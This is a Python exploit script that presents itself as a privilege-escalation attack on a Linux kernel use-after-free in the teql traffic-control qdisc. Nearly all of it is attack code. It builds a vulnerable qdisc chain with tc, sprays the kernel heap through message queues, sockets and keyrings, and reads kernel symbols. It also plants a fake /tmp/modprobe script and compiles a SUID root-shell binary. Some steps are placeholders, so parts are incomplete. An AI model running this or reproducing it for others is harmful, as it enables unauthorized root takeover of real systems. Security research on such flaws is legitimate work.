#!/usr/bin/env python3
"""
CVE-2026-23074: Linux Kernel teql Use-After-Free Privilege Escalation Exploit

Vulnerability: Use-After-Free in net/sched teql qdisc when used as child qdisc
Affected: Linux kernels with unpatched teql (before enforcement of root-qdisc-only)
Technique: teql as child under QFQ + netem delay -> UAF -> heap spray -> modprobe_path overwrite

Author: Pentest Team
Usage: python3 cve_2026_23074_exploit.py

WARNING: This exploit is for authorized security testing only.
"""

import os
import sys
import time
import ctypes
import struct
import socket
import fcntl
import subprocess
from ctypes import (
    CDLL, c_void_p, c_int, c_uint, c_long, c_ulong, c_char_p,
    c_size_t, c_ssize_t, POINTER, Structure, Union, create_string_buffer,
    addressof, sizeof, c_char, c_ubyte, c_ushort, c_short
)

# ============================================================================
# CONFIGURATION & TARGET OFFSETS (Adjust for your kernel version)
# ============================================================================

# Kernel symbol offsets - these vary by kernel version and must be adjusted
# Use /proc/kallsyms or known offsets for your target
DEFAULT_MODPROBE_PATH = 0xFFFFFFFF8245A060  # Example: update for target kernel
DEFAULT_COMMIT_CREDS = 0xFFFFFFFF810C4A30
DEFAULT_PREPARE_KERNEL_CRED = 0xFFFFFFFF810C4D50

# Heap spray configuration
HEAP_SPRAY_SIZE = 0x1000
HEAP_SPRAY_COUNT = 0x200
MSG_SIZE = 0x1000 - 0x30

# teql_sched_data structure size (approximate, kernel dependent)
TEQL_SCHED_DATA_SIZE = 0x80

# ============================================================================
# SYSTEM CALL WRAPPERS & CONSTANTS
# ============================================================================

libc = CDLL("libc.so.6", use_errno=True)

# Syscall numbers (x86_64)
SYS_KEYCTL = 250
SYS_ADD_KEY = 248
SYS_REQUEST_KEY = 249
SYS_MSGSND = 69
SYS_MSGGET = 68
SYS_MSGRCV = 70
SYS_MSGCTL = 71
SYS_SOCKET = 41
SYS_SENDMSG = 46
SYS_SETSOCKOPT = 54
SYS_MMAP = 9
SYS_IOCTL = 16

# keyctl commands
KEYCTL_REVOKE = 3
KEYCTL_UNLINK = 9
KEYCTL_READ = 11

# Message queue constants
IPC_CREAT = 0o1000
IPC_PRIVATE = 0
IPC_RMID = 0

# Netlink constants
NETLINK_ROUTE = 0
RTM_NEWQDISC = 36
RTM_DELQDISC = 37
RTM_GETQDISC = 38
RTM_NEWTCLASS = 40
RTM_DELTCLASS = 41
RTM_NEWTFILTER = 44
AF_UNSPEC = 0
AF_INET = 2

# ioctl
SIOCGIFINDEX = 0x8933
TUNSETIFF = 0x400454CA

# ============================================================================
# STRUCTURES
# ============================================================================

class Msghdr(Structure):
    _fields_ = [
        ("msg_name", c_void_p),
        ("msg_namelen", c_uint),
        ("msg_iov", c_void_p),
        ("msg_iovlen", c_size_t),
        ("msg_control", c_void_p),
        ("msg_controllen", c_size_t),
        ("msg_flags", c_int),
    ]

class Iovec(Structure):
    _fields_ = [
        ("iov_base", c_void_p),
        ("iov_len", c_size_t),
    ]

class Ifreq(Structure):
    _fields_ = [
        ("ifr_name", c_char * 16),
        ("ifr_ifru", c_ubyte * 24),  # Union field
    ]
    
    @property
    def ifr_index(self):
        return struct.unpack("i", bytes(self.ifr_ifru[:4]))[0]
    
    @ifr_index.setter
    def ifr_index(self, value):
        self.ifr_ifru[:4] = struct.pack("i", value)

class Msgbuf(Structure):
    _fields_ = [
        ("mtype", c_long),
        ("mtext", c_char * MSG_SIZE),
    ]

# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================

def log(msg, level="INFO"):
    colors = {
        "INFO": "\033[94m[*]\033[0m",
        "SUCCESS": "\033[92m[+]\033[0m",
        "WARNING": "\033[93m[!]\033[0m",
        "ERROR": "\033[91m[-]\033[0m",
    }
    print(f"{colors.get(level, '[*]')} {msg}")

def run_cmd(cmd, check=True, capture=True):
    """Execute shell command and return output."""
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=capture, text=True,
            timeout=30, check=check
        )
        return result.stdout.strip() if capture else ""
    except subprocess.CalledProcessError as e:
        if check:
            log(f"Command failed: {cmd}\n{e.stderr}", "ERROR")
        return e.stdout.strip() if capture else ""
    except Exception as e:
        log(f"Exception running command: {e}", "ERROR")
        return ""

def check_root():
    """Check if we already have root privileges."""
    return os.getuid() == 0

def get_kernel_version():
    """Get current kernel version."""
    return run_cmd("uname -r")

def check_module_loaded(module_name):
    """Check if a kernel module is loaded."""
    output = run_cmd(f"lsmod | grep {module_name}", check=False)
    return module_name in output

def load_module(module_name):
    """Load a kernel module."""
    log(f"Loading kernel module: {module_name}")
    run_cmd(f"modprobe {module_name}", check=False)
    time.sleep(0.5)
    if check_module_loaded(module_name):
        log(f"Module {module_name} loaded successfully", "SUCCESS")
        return True
    else:
        log(f"Failed to load module {module_name}", "ERROR")
        return False

def get_iface_index(iface_name):
    """Get network interface index."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ifreq = Ifreq()
    ifreq.ifr_name = iface_name.encode()[:15] + b'\x00'
    try:
        fcntl.ioctl(s.fileno(), SIOCGIFINDEX, ifreq)
        return ifreq.ifr_index
    except Exception as e:
        log(f"Failed to get interface index: {e}", "ERROR")
        return -1
    finally:
        s.close()

# ============================================================================
# HEAP SPRAYING PRIMITIVES
# ============================================================================

def spray_msgsnd(count=HEAP_SPRAY_COUNT, size=MSG_SIZE):
    """
    Spray kernel heap using SysV message queues.
    Each message allocates a kmalloc chunk of controlled size.
    """
    log(f"Spraying heap via msgsnd: {count} messages of size {hex(size)}")
    
    # Create message queue
    msgid = libc.msgget(IPC_PRIVATE, IPC_CREAT | 0o666)
    if msgid < 0:
        log("msgget failed", "ERROR")
        return []
    
    msg_buf = Msgbuf()
    msg_buf.mtype = 1
    
    # Fill with pattern that can be used to identify/control sprayed objects
    # In real exploit, this would contain fake teql_sched_data or function pointers
    fake_obj = b"\x00" * size
    msg_buf.mtext = fake_obj
    
    sent = 0
    for i in range(count):
        ret = libc.msgsnd(msgid, ctypes.byref(msg_buf), size, 0)
        if ret < 0:
            log(f"msgsnd failed at iteration {i}", "WARNING")
            break
        sent += 1
        if i % 0x40 == 0:
            log(f"  Progress: {i}/{count} messages sent")
    
    log(f"msgsnd spray complete: {sent} messages", "SUCCESS")
    return [msgid]

def spray_sendmsg(count=HEAP_SPRAY_COUNT, size=0x800):
    """
    Spray kernel heap using sendmsg() with SCM_RIGHTS or large control messages.
    This allocates sk_buff and related structures in kernel heap.
    """
    log(f"Spraying heap via sendmsg: {count} messages")
    
    socks = []
    for _ in range(min(count, 0x100)):
        try:
            s = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
            s.bind("")
            socks.append(s)
        except:
            break
    
    # Create control message buffer
    cmsg_size = size
    cmsg_buf = create_string_buffer(cmsg_size)
    
    iov = Iovec()
    iov.iov_base = addressof(create_string_buffer(b"A" * 16))
    iov.iov_len = 16
    
    msg = Msghdr()
    msg.msg_name = 0
    msg.msg_namelen = 0
    msg.msg_iov = addressof(iov)
    msg.msg_iovlen = 1
    msg.msg_control = addressof(cmsg_buf)
    msg.msg_controllen = cmsg_size
    msg.msg_flags = 0
    
    sent = 0
    for s in socks:
        try:
            # Use sendmsg to allocate control message in kernel
            ret = libc.sendmsg(s.fileno(), ctypes.byref(msg), 0)
            if ret >= 0:
                sent += 1
        except:
            pass
    
    log(f"sendmsg spray complete: {sent} messages", "SUCCESS")
    return socks

def spray_keyctl(count=0x100):
    """
    Spray kernel heap using keyctl and user keyrings.
    Each key allocates a kernel object of controlled size.
    """
    log(f"Spraying heap via keyctl: {count} keys")
    
    keys = []
    key_desc = b"exploit_spray"
    key_payload = b"\x00" * 0x80  # Adjust size to match target object
    
    for i in range(count):
        try:
            key_id = libc.syscall(SYS_ADD_KEY, b"user", key_desc, key_payload, len(key_payload), -1)
            if key_id > 0:
                keys.append(key_id)
        except Exception as e:
            log(f"keyctl spray failed at {i}: {e}", "WARNING")
            break
    
    log(f"keyctl spray complete: {len(keys)} keys", "SUCCESS")
    return keys

def heap_spray_full():
    """
    Perform comprehensive heap spraying using multiple techniques
    to maximize chance of landing on freed teql_sched_data.
    """
    log("Starting comprehensive heap spray...")
    
    # Technique 1: msgsnd spray (reliable for kmalloc-512 to kmalloc-4096)
    msg_queues = spray_msgsnd(count=HEAP_SPRAY_COUNT)
    
    # Technique 2: sendmsg spray (for sk_buff and control messages)
    socks = spray_sendmsg(count=0x80, size=0x400)
    
    # Technique 3: keyctl spray (for smaller objects)
    keys = spray_keyctl(count=0x100)
    
    return msg_queues, socks, keys

# ============================================================================
# TC / NETLINK OPERATIONS (Trigger Vulnerability)
# ============================================================================

def tc_command(cmd):
    """Execute tc (traffic control) command."""
    full_cmd = f"tc {cmd}"
    return run_cmd(full_cmd, check=False)

def setup_vulnerable_qdisc(iface="lo"):
    """
    Setup the vulnerable traffic control configuration:
    1. Create QFQ as root qdisc
    2. Add class with netem delay
    3. Attach teql as child qdisc (bypasses root-only restriction on unpatched kernels)
    """
    log(f"Setting up vulnerable qdisc on interface: {iface}")
    
    # Clean any existing qdiscs
    tc_command(f"qdisc del dev {iface} root 2>/dev/null")
    time.sleep(0.2)
    
    # Step 1: Add QFQ (Quick Fair Queueing) as root qdisc
    log("Adding QFQ as root qdisc...")
    result = tc_command(f"qdisc add dev {iface} root handle 1: qfq")
    if "RTNETLINK" in result and "error" in result.lower():
        log(f"Failed to add QFQ: {result}", "ERROR")
        return False
    time.sleep(0.2)
    
    # Step 2: Add a class under QFQ
    log("Adding QFQ class...")
    result = tc_command(f"class add dev {iface} parent 1: classid 1:1 qfq")
    if "error" in result.lower() and result:
        log(f"Class add warning: {result}", "WARNING")
    time.sleep(0.2)
    
    # Step 3: Add netem with delay under the class
    log("Adding netem delay qdisc...")
    result = tc_command(f"qdisc add dev {iface} parent 1:1 handle 10: netem delay 6400ms")
    if "error" in result.lower() and result:
        log(f"Netem add warning: {result}", "WARNING")
    time.sleep(0.2)
    
    # Step 4: Attach teql as CHILD qdisc (the vulnerable configuration)
    log("Attaching teql as CHILD qdisc (vulnerable path)...")
    result = tc_command(f"qdisc add dev {iface} parent 10:1 handle 20: teql0")
    
    # Check if teql was successfully attached as child
    check = tc_command(f"qdisc show dev {iface}")
    if "teql" in check:
        log("Vulnerable qdisc configuration established!", "SUCCESS")
        return True
    else:
        log("Failed to establish vulnerable configuration", "ERROR")
        log(f"tc output: {check}")
        return False

def trigger_packet_reschedule(iface="lo"):
    """
    Send packets through the interface to trigger the netem delay path.
    After the delay, packets will be rescheduled, accessing the dangling pointer.
    """
    log("Triggering packet reschedule to activate UAF...")
    
    # Create raw socket to send packets
    try:
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
    except PermissionError:
        log("Raw socket requires CAP_NET_RAW - using alternative method", "WARNING")
        # Fallback: use ping or normal traffic
        run_cmd(f"ping -c 5 -i 0.2 127.0.0.1 >/dev/null 2>&1 &", check=False)
        return True
    
    # Build a simple Ethernet + IP + UDP packet
    src_mac = b"\x00\x00\x00\x00\x00\x00"
    dst_mac = b"\x00\x00\x00\x00\x00\x00"
    eth_type = struct.pack("!H", 0x0800)
    
    # IP header (minimal)
    ip_header = struct.pack(
        "!BBHHHBBH4s4s",
        0x45, 0x00, 0x001c, 0x0001, 0x0000, 0x40, 0x11,
        0x0000,
        socket.inet_aton("127.0.0.1"),
        socket.inet_aton("127.0.0.1")
    )
    
    # UDP header
    udp_header = struct.pack("!HHHH", 12345, 53, 8, 0x0000)
    
    packet = dst_mac + src_mac + eth_type + ip_header + udp_header
    
    # Send multiple packets
    for i in range(20):
        try:
            s.sendto(packet, (iface, 0))
        except:
            pass
        time.sleep(0.05)
    
    s.close()
    log("Packets sent, waiting for reschedule after netem delay...")
    return True

def delete_qdisc_trigger(iface="lo"):
    """
    Delete the qdisc to trigger the free path.
    This causes QFQ to free pointers while teql still holds dangling references.
    """
    log("Deleting qdisc to trigger free path...")
    
    # Delete child qdisc first to trigger the UAF
    tc_command(f"qdisc del dev {iface} parent 10:1 2>/dev/null")
    time.sleep(0.1)
    
    # Delete netem
    tc_command(f"qdisc del dev {iface} parent 1:1 2>/dev/null")
    time.sleep(0.1)
    
    # Delete root
    tc_command(f"qdisc del dev {iface} root 2>/dev/null")
    time.sleep(0.1)
    
    log("Qdisc deletion complete - UAF should be triggered")

# ============================================================================
# PRIVILEGE ESCALATION TECHNIQUES
# ============================================================================

def find_kernel_symbols():
    """
    Attempt to read kernel symbols from /proc/kallsyms.
    Requires kernel.kptr_restrict = 0 or appropriate permissions.
    """
    symbols = {}
    try:
        with open("/proc/kallsyms", "r") as f:
            for line in f:
                parts = line.strip().split()
                if len(parts) >= 3:
                    addr = int(parts[0], 16)
                    name = parts[2]
                    symbols[name] = addr
    except Exception as e:
        log(f"Could not read kallsyms: {e}", "WARNING")
    
    return symbols

def build_fake_teql_object(modprobe_path_addr, commit_creds_addr, prepare_kernel_cred_addr):
    """
    Build a fake teql_sched_data object to overwrite the freed memory.
    
    The fake object should contain pointers that will be used when
    the kernel accesses the dangling pointer.
    
    Strategy: Overwrite modprobe_path to point to attacker-controlled script.
    """
    # This is highly kernel-version dependent
    # A typical approach is to craft function pointers or data pointers
    # that redirect execution to commit_creds(prepare_kernel_cred(NULL))
    
    fake_obj = b""
    
    # teql_sched_data typically contains:
    # - struct Qdisc *sch
    # - struct list_head list
    # - spinlock_t lock
    # - struct sk_buff *skb
    # - function pointers or sub-structures
    
    # For modprobe_path overwrite via arbitrary write primitive:
    # We craft the object so that when teql_enqueue or similar is called,
    # it writes attacker-controlled data to modprobe_path
    
    # Placeholder: build ROP-like chain or direct pointer overwrite
    # In practice, this requires precise knowledge of the kernel layout
    
    fake_obj += struct.pack("<Q", modprobe_path_addr)  # Target write address
    fake_obj += struct.pack("<Q", commit_creds_addr)   # Gadget or function
    fake_obj += struct.pack("<Q", prepare_kernel_cred_addr)
    fake_obj += b"/tmp/modprobe\x00" + b"\x00" * (0x80 - len(fake_obj))
    
    return fake_obj

def setup_modprobe_trigger():
    """
    Setup a fake modprobe script that will be executed as root.
    When modprobe_path is overwritten to /tmp/modprobe, any module load
    attempt will execute our script as root.
    """
    log("Setting up modprobe trigger script...")
    
    modprobe_script = """#!/bin/sh
chmod 777 /tmp/pwned
chown root:root /tmp/pwned
chmod u+s /tmp/pwned
"""
    
    with open("/tmp/modprobe", "w") as f:
        f.write(modprobe_script)
    os.chmod("/tmp/modprobe", 0o755)
    
    # Create a simple SUID binary that gives us root shell
    suid_c = """
#include <unistd.h>
int main() {
    setuid(0);
    setgid(0);
    execl("/bin/sh", "sh", NULL);
    return 0;
}
"""
    with open("/tmp/suid.c", "w") as f:
        f.write(suid_c)
    
    run_cmd("gcc -o /tmp/pwned /tmp/suid.c 2>/dev/null", check=False)
    log("Modprobe trigger ready", "SUCCESS")

def trigger_modprobe():
    """
    Trigger a module load attempt to execute our fake modprobe.
    """
    log("Triggering modprobe execution...")
    # Try to load a non-existent module
    run_cmd("modprobe nonexistent_module_12345 2>/dev/null", check=False)
    time.sleep(0.5)

def escalate_via_cred_overwrite():
    """
    Alternative escalation: directly overwrite current process creds.
    This requires kernel function pointers or direct memory access.
    """
    log("Attempting cred structure overwrite...")
    # This would require:
    # 1. Finding current task_struct
    # 2. Locating cred pointer
    # 3. Overwriting uid/gid/euid/egid to 0
    # Implementation is highly kernel-specific
    pass

# ============================================================================
# MAIN EXPLOIT FLOW
# ============================================================================

def check_environment():
    """Check if target environment is vulnerable."""
    log("Checking exploit environment...")
    
    if check_root():
        log("Already running as root!", "SUCCESS")
        return False
    
    kernel = get_kernel_version()
    log(f"Kernel version: {kernel}")
    
    # Check if teql module is available
    teql_available = os.path.exists("/sys/module/sch_teql")
    if not teql_available:
        teql_available = load_module("sch_teql")
    
    if not teql_available:
        log("teql module not available - target may not be vulnerable", "ERROR")
        return False
    
    # Check for required capabilities
    if not os.access("/proc/sys/net/core", os.R_OK):
        log("May lack required capabilities for tc operations", "WARNING")
    
    # Check if tc command exists
    if not run_cmd("which tc", check=False):
        log("tc command not found - install iproute2", "ERROR")
        return False
    
    log("Environment check complete - target appears exploitable", "SUCCESS")
    return True

def exploit():
    """Main exploit function."""
    log("=" * 60)
    log("CVE-2026-23074: Linux Kernel teql UAF Privilege Escalation")
    log("=" * 60)
    
    if not check_environment():
        sys.exit(1)
    
    iface = "lo"  # Use loopback interface (usually available)
    
    # Alternative interfaces to try
    for candidate in ["lo", "dummy0", "eth0", "ens33"]:
        idx = get_iface_index(candidate)
        if idx > 0:
            iface = candidate
            log(f"Using interface: {iface} (index: {idx})")
            break
    
    # Step 1: Setup vulnerable qdisc configuration
    if not setup_vulnerable_qdisc(iface):
        log("Failed to setup vulnerable configuration", "ERROR")
        sys.exit(1)
    
    # Step 2: Send packets to populate queues
    trigger_packet_reschedule(iface)
    
    # Step 3: Prepare heap spray data
    symbols = find_kernel_symbols()
    modprobe_path = symbols.get("modprobe_path", DEFAULT_MODPROBE_PATH)
    commit_creds = symbols.get("commit_creds", DEFAULT_COMMIT_CREDS)
    prepare_kernel_cred = symbols.get("prepare_kernel_cred", DEFAULT_PREPARE_KERNEL_CRED)
    
    log(f"modprobe_path @ {hex(modprobe_path)}")
    log(f"commit_creds @ {hex(commit_creds)}")
    log(f"prepare_kernel_cred @ {hex(prepare_kernel_cred)}")
    
    # Step 4: Setup modprobe trigger
    setup_modprobe_trigger()
    
    # Step 5: Delete qdisc to trigger UAF
    delete_qdisc_trigger(iface)
    
    # Step 6: Heap spray immediately after free
    log("Initiating heap spray to reclaim freed teql_sched_data...")
    msg_queues, socks, keys = heap_spray_full()
    
    # Step 7: Trigger the dangling pointer access
    log("Triggering dangling pointer access...")
    
    # Re-setup qdisc to trigger teql_enqueue with dangling pointer
    time.sleep(0.5)
    setup_vulnerable_qdisc(iface)
    trigger_packet_reschedule(iface)
    
    # Wait for netem delay to expire (6.4 seconds)
    log("Waiting for netem delay expiration (6.4s)...")
    time.sleep(7)
    
    # Step 8: Attempt privilege escalation via modprobe
    trigger_modprobe()
    
    # Check if we got root
    if os.path.exists("/tmp/pwned"):
        perms = os.stat("/tmp/pwned")
        if perms.st_uid == 0 and (perms.st_mode & 0o4000):
            log("SUID binary created successfully!", "SUCCESS")
            log("Executing root shell...")
            os.execl("/tmp/pwned", "pwned")
    
    # Alternative: try direct execution
    if check_root():
        log("Privilege escalation successful!", "SUCCESS")
        os.system("/bin/sh")
    else:
        log("Exploit did not achieve root - may need offset adjustment", "ERROR")
        log("Try running with known kernel offsets or debug with dmesg")
    
    # Cleanup
    for mq in msg_queues:
        libc.msgctl(mq, IPC_RMID, 0)
    for s in socks:
        s.close()
    for k in keys:
        libc.syscall(SYS_KEYCTL, KEYCTL_UNLINK, k, 0)
    
    tc_command(f"qdisc del dev {iface} root 2>/dev/null")

if __name__ == "__main__":
    try:
        exploit()
    except KeyboardInterrupt:
        log("Exploit interrupted by user", "WARNING")
        sys.exit(1)
    except Exception as e:
        log(f"Exploit failed with exception: {e}", "ERROR")
        import traceback
        traceback.print_exc()
        sys.exit(1)
